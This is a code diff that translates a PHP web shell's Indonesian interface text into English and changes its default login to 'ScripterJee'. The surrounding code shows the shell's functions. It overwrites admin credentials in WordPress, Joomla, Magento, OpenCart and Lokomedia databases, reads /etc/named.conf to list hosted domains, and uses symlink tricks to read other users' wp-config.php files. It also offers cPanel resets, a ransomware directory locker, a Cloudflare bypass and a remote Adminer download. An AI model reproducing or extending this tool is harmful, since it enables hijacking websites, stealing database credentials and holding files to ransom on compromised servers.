@@ -59,8 +59,9 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])){
   }
 }
 /*
-  
- 
+  * Akhir Login
+  *
+  * Aksi Download
 */
 if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')){
   @ob_clean();
@@ -714,7 +715,7 @@ function aksiJump($dir,$file,$ip){
             if(function_exists('posix_getpwuid')){
               $domain_jump = file_get_contents("/etc/named.conf");
               if($domain_jump == ''){
-                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
+                echo " => ( <font color=red>Can't get the domain name</font> )<br>";
               }else{
                 preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                 foreach($domains_jump[1] as $dj){
@@ -1067,9 +1068,9 @@ function aksiAdminer($dir,$file){
     echo "<a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
   }else{
     if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")){
-      echo "<p class='text-center'>Berhasil Membuat Adminer</p><a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
+      echo "<p class='text-center'>Successfully Created Adminer</p><a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
     }else{
-      echo "<p class='text-center text-danger'>Gagal Membuat Adminer</p>";
+      echo "<p class='text-center text-danger'>Failed to Create Adminer</p>";
     }
   }
   exit;
@@ -1078,7 +1079,7 @@ function aksiSym($dir,$file){
   $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
   $d0mains = @file("/etc/named.conf");
   if(!$d0mains){
-    die ("[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]<br/><font color='red'>Error tidak dapat membaca  /etc/named.conf</font><br/><br/>");
+    die ("[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]<br/><font color='red'>Error can't read  /etc/named.conf</font><br/><br/>");
   }
   ##htaccess
   if($d0mains){
@@ -1263,7 +1264,7 @@ function sym404($dir,$file){
       File Target: <input type="text" class="form-control" name="dir" value="/home/'.$cp.'/public_html/wp-config.php"><br/>
       Save As: <input type="text" class="form-control" name="isi" placeholder="[Ex] file.txt"/><br/>
       <input type="submit" class="btn btn-danger btn-block" value="Execute" name="execute"/>
-      <p class="text-muted">NB: Letak wp-config tidak semuanya berada di <u>public_html/wp-config.php</u> jadi silahkan ubah sesuai letaknya.</p>
+      <p class="text-muted">NB: The wp-config location is not all there <u>public_html/wp-config.php</u> jso please change it according to the location.</p>
     </form>';
   }
   exit;
@@ -1467,7 +1468,7 @@ function resetCp($dir){
       <div class="input-group-prepend">
         <div class="input-group-text"><i class="fa fa-envelope"></i></div>
         </div>
-        <input type="email" name="email" class="form-control" placeholder="Masukan Email..."/>
+        <input type="email" name="email" class="form-control" placeholder="Enter Email..."/>
       </div>
       <input type="submit" name="submit" class="btn btn-danger btn-block" value="Send"/>
     </div>
@@ -1494,7 +1495,7 @@ function resetCp($dir){
 function autoEdit($dir,$file){
   if($_POST['hajar']){
     if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6){
-      echo "Username dan Password harus lebih dari 6 karakter";
+      echo "Username and Password must be more than 6 characters";
     }else{
       $user_baru = $_POST['user_baru'];
       $pass_baru = md5($_POST['pass_baru']);
@@ -1520,14 +1521,14 @@ function autoEdit($dir,$file){
           echo "Config => ".$file_conf."<br>";
           echo "CMS => Joomla<br>";
           if($site == ''){
-            echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
+            echo "Sitename => <font color=red>error, Can't get the domain name</font><br>";
           }else{
             echo "Sitename => $site<br>";
           }
           if(!$update OR !$conn OR !$db){
             echo "Status => <font color=red>".mysql_error()."</font><br><br>";
           }else{
-            echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
+            echo "Status => <font color=lime>Success, please log in with the new User & Password.</font><br><br>";
           }
           mysql_close($conn);
         }elseif(preg_match("/WordPress/",$config)){
@@ -1547,7 +1548,7 @@ function autoEdit($dir,$file){
           $result2 = mysql_fetch_array($q2);
           $target = $result2[option_value];
           if($target == ''){
-          $url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
+          $url_target = "Login => <font color=red>Error, Cannot retrieve the domain name</font><br>";
           }else{
             $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
           }
@@ -1558,7 +1559,7 @@ function autoEdit($dir,$file){
           if(!$update OR !$conn OR !$db){
             echo "Status => <font color=red>".mysql_error()."</font><br><br>";
           }else{
-            echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
+            echo "Status => <font color=lime>Success, please log in with the new User & Password.</font><br><br>";
           }
           mysql_close($conn);
         }elseif(preg_match("/Magento|Mage_Core/",$config)){
@@ -1578,7 +1579,7 @@ function autoEdit($dir,$file){
           $result2 = mysql_fetch_array($q2);
           $target = $result2[value];
           if($target == ''){
-            $url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
+            $url_target = "Login => <font color=red>Error, Cannot retrieve the domain name</font><br>";
           }else{
             $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
           }
@@ -1589,7 +1590,7 @@ function autoEdit($dir,$file){
           if(!$update OR !$conn OR !$db){
             echo "Status => <font color=red>".mysql_error()."</font><br><br>";
           }else{
-            echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
+            echo "Status => <font color=lime>Success, please log in with the new User & Password.</font><br><br>";
           }
           mysql_close($conn);
         }elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)){
@@ -1606,7 +1607,7 @@ function autoEdit($dir,$file){
           $id = $result[user_id];
           $target = ambilkata($config,"HTTP_SERVER', '","'");
           if($target == ''){
-            $url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
+            $url_target = "Login => <font color=red>Error, Cannot retrieve the domain name</font><br>";
           }else{
             $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
           }
@@ -1617,7 +1618,7 @@ function autoEdit($dir,$file){
           if(!$update OR !$conn OR !$db){
             echo "Status => <font color=red>".mysql_error()."</font><br><br>";
           }else{
-            echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
+            echo "Status => <font color=lime>Success, please log in with the new User & Password.</font><br><br>";
           }
           mysql_close($conn);
         }elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)){
@@ -1634,9 +1635,9 @@ function autoEdit($dir,$file){
           $target = $result[alamat_website];
           if($target == ''){
             $target2 = $result[url];
-            $url_target = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
+            $url_target = "Login => <font color=red>Error, Cannot retrieve the domain name</font><br>";
             if($target2 == ''){
-              $url_target2 = "Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>";
+              $url_target2 = "Login => <font color=red>Error, Cannot retrieve the domain name</font><br>";
             }else{
               $cek_login3 = file_get_contents("$target2/adminweb/");
               $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
@@ -1645,7 +1646,7 @@ function autoEdit($dir,$file){
               }elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)){
                 $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
               }else{
-                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>I don't know where the admin login is :p</font> ]<br>";
               }
             }
           }else{
@@ -1656,13 +1657,13 @@ function autoEdit($dir,$file){
             }elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)){
               $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
             }else{
-              $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+              $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>I don't know where the admin login is :p</font> ]<br>";
             }
           }
           $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
           echo "Config => ".$file_conf."<br>";
           echo "CMS => Lokomedia<br>";
-          if(preg_match('/Error, Tidak dapat mengambil nama domainnya/', $url_target)){
+          if(preg_match('/Error, Cannot retrieve the domain name/', $url_target)){
             echo $url_target2;
           }else{
             echo $url_target;
@@ -1670,7 +1671,7 @@ function autoEdit($dir,$file){
           if(!$update OR !$conn OR !$db){
             echo "Status => <font color=red>".mysql_error()."</font><br><br>";
           }else{
-            echo "Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>";
+            echo "Status => <font color=lime>Success, please log in with the new User & Password.</font><br><br>";
           }
           mysql_close($conn);
         }
@@ -1679,14 +1680,14 @@ function autoEdit($dir,$file){
   }else{
     echo "<h3 class='text-center mb-4'>Auto Edit User</h3>
     <form method='post'>
-      <h5>Lokasi Dir Config</h5>
+      <h5>Dir Config Location</h5>
       <input type='text' class='form-control mb-3' name='config_dir' value='$dir'>
       <h5>Set User & Pass :</h5>
-      <input type='text' name='user_baru' value='indosec' class='form-control mb-3' placeholder='Set Username'>
-      <input type='text' name='pass_baru' value='indosec' class='form-control mb-4' placeholder='Set Password'>
+      <input type='text' name='user_baru' value='ScripterJee' class='form-control mb-3' placeholder='Set Username'>
+      <input type='text' name='pass_baru' value='ScripterJee123' class='form-control mb-4' placeholder='Set Password'>
       <input type='submit' name='hajar' value='Edit User' class='btn btn-danger btn-block'>
     </form>
-    <p class='text-muted mb-4'>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</p>";
+    <p class='text-muted mb-4'>NB: This tool works if run in a folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</p>";
   }
   exit;
 }
@@ -1736,7 +1737,7 @@ function ransom($dir,$file){
     echo '<form method="post">
       <div class="form-group">
         <h4 class="text-center mb-4"><i class="fa fa-lock"></i> Ransomware</h4>
-        <label>Pilih Directory :</label>
+        <label>Choose Directory :</label>
         <div class="form-group input-group">
           <div class="input-group-prepend">
             <div class="input-group-text"><i class="fa fa-home"></i></div>
@@ -1784,7 +1785,7 @@ function scj($dir){
       </table>";
     }
   }
-  echo "<p class='text-muted'>NB : Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/namafolder_config )</p>";
+  echo "<p class='text-muted'>NB : This tool works if run in a folder <u>config</u> ( ex: /home/user/public_html/namafolder_config )</p>";
   exit;
 }
 function bypasscf(){
@@ -1792,7 +1793,7 @@ function bypasscf(){
     <h5 class="text-center mb-3">Bypass Cloud Flare</h5>
     <div class="form-group input-group">
       <select class="form-control" name="idsPilih">
-        <option>Pilih Metode</option>
+        <option>Select Method</option>
         <option>ftp</option>
         <option>direct-conntect</option>
         <option>webmail</option>
@@ -1800,7 +1801,7 @@ function bypasscf(){
       </select>
     </div>
     <div class="form-group input-group mb-4">
-      <input class="form-control" type="text" name="target" placeholder="Masukan Url">
+      <input class="form-control" type="text" name="target" placeholder="Enter Url">
       <input class="btn btn-danger form-control" type="submit" value="Bypass">
     </div>
   </form>';
@@ -1920,10 +1921,10 @@ function zipMenu($dir,$file){
       $zip = $_POST["file_zip"];
       if (Zip_Extrack($zip, $dir)){
         $swa = "success";
-        $text = "Berhasil Mengekstrak Zip";
+        $text = "Zip Extracted Successfully";
         swall($swa,$text,$dir);
       }else{
-        echo "<b>Gagal!</b>";
+        echo "<b>Fail!</b>";
       }
     }
   echo '</div></div></div>';
@@ -2123,7 +2124,7 @@ function zipMenu($dir,$file){
           <a href="?dir='.$dir.'&aksi=bypascf" class="fiture btn btn-warning btn-sm"><i class="fas fa-cloud"></i> Bypass Cloud Flare</a>
           <a href="?dir='.$dir.'&aksi=zip_menu" class="fiture btn btn-warning btn-sm"><i class="fa fa-file-archive-o"></i> Zip Menu</a>
           <a href="?about" class="fiture btn btn-warning btn-sm"><i class="fa fa-info"></i> About Us</a>
-          <a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> keluar</a>
+          <a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> Logout</a>
         </div>
       </div>
       <div class="row">
